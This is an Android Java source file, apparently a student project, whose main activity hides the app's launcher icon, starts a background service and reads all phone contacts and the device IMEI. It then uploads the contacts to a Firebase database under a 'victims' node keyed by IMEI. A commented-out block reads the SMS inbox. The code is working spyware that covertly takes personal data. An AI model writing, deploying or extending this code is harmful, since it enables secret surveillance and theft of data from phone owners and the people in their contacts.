package com.example.iiitd.droid;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.example.iiitd.droid.model.Contact;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static android.R.attr.key;

public class MainActivity extends AppCompatActivity {

    // [START declare_database_ref]
    private DatabaseReference mDatabase;
    String key = null;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_main);

        // To hide the activity
        startService(new Intent(getBaseContext(), ServiceClass.class));
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, com.example.iiitd.droid.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        List<Contact> allConatacts = new ArrayList<Contact>();

        // Read All Contacts
        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        String[] cNames = phones.getColumnNames();

        for(int temp = 0; temp<cNames.length;temp++) {
            Log.v("Column Names"+temp, cNames[temp]);
        }
        while (phones.moveToNext()) {

            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            String lastTimeCalled = phones.getString(64);
            SimpleDateFormat sf = new SimpleDateFormat("yyyy-MM-dd");
            Date date = new Date(Long.parseLong(lastTimeCalled));
            allConatacts.add(new Contact(name,phoneNumber,sf.format(date)));

            // String lastTimeContacted = phones.getString(phones.getColumnIndex(ContactsContract.DisplayPhoto));
        }

        // Read IMEI NO
        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        Log.v("IMEI" +
                " NO",telephonyManager.getDeviceId()) ;


        // Store all Contacts
        mDatabase = FirebaseDatabase.getInstance().getReference();
        mDatabase.child("victims").child(telephonyManager.getDeviceId()).child("contacts").setValue(allConatacts);

        // Generating unique key for questions
   /*     //String keqQues = mDatabase.child("contacts").child(key).child("questions").push().getKey();
        Map<String, List<Object>> questionValues= allConatacts;
        Map<String, Object> childUpdates = new HashMap<>();
        childUpdates.put("victims/" + key+"/contacts/"+keqQues, questionValues);


        mDatabase.updateChildren(childUpdates);


*/
        Toast.makeText(this, " Contacts Stored...", Toast.LENGTH_SHORT).show();
        Log.v("Contacts","Contacts Added SuccessFully");
        phones.close();

  /*      //  Read SMS
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                String msgData = "";
                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                }
         //       Log.v("MESSAGES",msgData);
                // use msgData
            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
        }

        */



        finish();
    }
}
